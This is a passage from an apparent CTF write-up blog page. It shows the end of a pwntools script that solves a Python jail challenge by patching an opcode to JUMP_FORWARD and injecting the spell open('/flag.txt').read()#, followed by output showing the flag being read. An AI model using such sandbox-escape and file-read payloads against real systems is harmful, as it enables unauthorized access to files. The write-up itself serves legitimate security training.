+</span><span>r.</span><span style=color:#bf616a>recvuntil</span><span>(</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>you'd like to use (an integer): </span><span>")
+</span><span>r.</span><span style=color:#bf616a>sendline</span><span>(dis.opmap["</span><span style=color:#a3be8c>JUMP_FORWARD</span><span>"].</span><span style=color:#bf616a>encode</span><span>())
+</span><span>
+</span><span>r.</span><span style=color:#bf616a>recvuntil</span><span>(</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>Enter 1 or 2: </span><span>")
+</span><span>r.</span><span style=color:#bf616a>sendline</span><span>(</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>2</span><span>")
+</span><span>
+</span><span>r.</span><span style=color:#bf616a>recvuntil</span><span>(</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>you'd like to mend (an integer): </span><span>")
+</span><span>r.</span><span style=color:#bf616a>sendline</span><span>(</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>3</span><span>")
+</span><span>
+</span><span>r.</span><span style=color:#bf616a>recvuntil</span><span>(</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>you'd like to use (an integer): </span><span>")
+</span><span>r.</span><span style=color:#bf616a>sendline</span><span>(</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>29</span><span>")
+</span><span>
+</span><span>r.</span><span style=color:#bf616a>recvuntil</span><span>(</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>Enter 1 or 2: </span><span>")
+</span><span>r.</span><span style=color:#bf616a>sendline</span><span>(</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>1</span><span>")
+</span><span>
+</span><span>r.</span><span style=color:#bf616a>recvuntil</span><span>(</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>Enter your spell: </span><span>")
+</span><span>r.</span><span style=color:#bf616a>sendline</span><span>(</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>open('/flag.txt').read()#</span><span>")
+</span><span>
+</span><span>response = r.</span><span style=color:#bf616a>recvuntil</span><span>(</span><span style=color:#b48ead>b</span><span>"</span><span style=color:#a3be8c>Enter 1 or 2:</span><span>").</span><span style=color:#bf616a>decode</span><span>()
+</span><span>
+</span><span style=color:#96b5b4>print</span><span>(response.</span><span style=color:#bf616a>strip</span><span>().</span><span style=color:#bf616a>splitlines</span><span>()[</span><span style=color:#d08770>0</span><span>])
+</span><span>r.</span><span style=color:#bf616a>close</span><span>()
+</span></code></pre><p>…and running that:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>❯</span><span> ./jail.py
+</span><span style=color:#bf616a>[+]</span><span> Opening connection to host5.metaproblems.com on port 7650: Done
+</span><span style=color:#bf616a>Spell</span><span> worked! The ancient voices whisper back: '</span><span style=color:#a3be8c>MetaCTF{good_luck_escaping_th3_guards}</span><span>'
+</span><span style=color:#bf616a>[*]</span><span> Closed connection to host5.metaproblems.com port 7650
+</span></code></pre></article><hr><nav id=post-nav><a class="post-nav-item post-nav-prev" href=https://blog.psypherpunk.io/blog/metactf-april-2024-flash-ctf/> <div class=nav-arrow>Previous</div> <span class=post-title>️🏴 MetaCTF April 2024 Flash CTF</span> </a><a class="post-nav-item post-nav-next" href=https://blog.psypherpunk.io/blog/metactf-june-2024-flash-ctf/> <div class=nav-arrow>Next</div> <span class=post-title>️🏴 MetaCTF June 2024 Flash CTF</span> </a></nav></main><footer id=site-footer><nav><ul><li><a href=https://blog.psypherpunk.io/blog/>Blog</a></ul></nav><p>© 2025 PsypherPunk<ul id=socials><li><a rel=" me" href=https://github.com/PsypherPunk title=GitHub> <i style="--icon:url(&#34;data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EGitHub%3C/title%3E%3Cpath d='M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12'/%3E%3C/svg%3E&#34;)" class=icon></i> <span>GitHub</span> </a><li><a rel=" me" href=https://hachyderm.io/@psypherpunk title=Mastodon> <i style="--icon:url(&#34;data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EMastodon%3C/title%3E%3Cpath d='M23.268 5.313c-.35-2.578-2.617-4.61-5.304-5.004C17.51.242 15.792 0 11.813 0h-.03c-3.98 0-4.835.242-5.288.309C3.882.692 1.496 2.518.917 5.127.64 6.412.61 7.837.661 9.143c.074 1.874.088 3.745.26 5.611.118 1.24.325 2.47.62 3.68.55 2.237 2.777 4.098 4.96 4.857 2.336.792 4.849.923 7.256.38.265-.061.527-.132.786-.213.585-.184 1.27-.39 1.774-.753a.057.057 0 0 0 .023-.043v-1.809a.052.052 0 0 0-.02-.041.053.053 0 0 0-.046-.01 20.282 20.282 0 0 1-4.709.545c-2.73 0-3.463-1.284-3.674-1.818a5.593 5.593 0 0 1-.319-1.433.053.053 0 0 1 .066-.054c1.517.363 3.072.546 4.632.546.376 0 .75 0 1.125-.01 1.57-.044 3.224-.124 4.768-.422.038-.008.077-.015.11-.024 2.435-.464 4.753-1.92 4.989-5.604.008-.145.03-1.52.03-1.67.002-.512.167-3.63-.024-5.545zm-3.748 9.195h-2.561V8.29c0-1.309-.55-1.976-1.67-1.976-1.23 0-1.846.79-1.846 2.35v3.403h-2.546V8.663c0-1.56-.617-2.35-1.848-2.35-1.112 0-1.668.668-1.67 1.977v6.218H4.822V8.102c0-1.31.337-2.35 1.011-3.12.696-.77 1.608-1.164 2.74-1.164 1.311 0 2.302.5 2.962 1.498l.638 1.06.638-1.06c.66-.999 1.65-1.498 2.96-1.498 1.13 0 2.043.395 2.74 1.164.675.77 1.012 1.81 1.012 3.12z'/%3E%3C/svg%3E&#34;)" class=icon></i> <span>Mastodon</span> </a><li><a rel=" me" href=https://twitter.com/PsypherPunk title=Twitter> <i style="--icon:url(&#34;data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3ETwitter%3C/title%3E%3Cpath d='M21.543 7.104c.015.211.015.423.015.636 0 6.507-4.954 14.01-14.01 14.01v-.003A13.94 13.94 0 0 1 0 19.539a9.88 9.88 0 0 0 7.287-2.041 4.93 4.93 0 0 1-4.6-3.42 4.916 4.916 0 0 0 2.223-.084A4.926 4.926 0 0 1 .96 9.167v-.062a4.887 4.887 0 0 0 2.235.616A4.928 4.928 0 0 1 1.67 3.148 13.98 13.98 0 0 0 11.82 8.292a4.929 4.929 0 0 1 8.39-4.49 9.868 9.868 0 0 0 3.128-1.196 4.941 4.941 0 0 1-2.165 2.724A9.828 9.828 0 0 0 24 4.555a10.019 10.019 0 0 1-2.457 2.549z'/%3E%3C/svg%3E&#34;)" class=icon></i> <span>Twitter</span> </a></ul></footer>
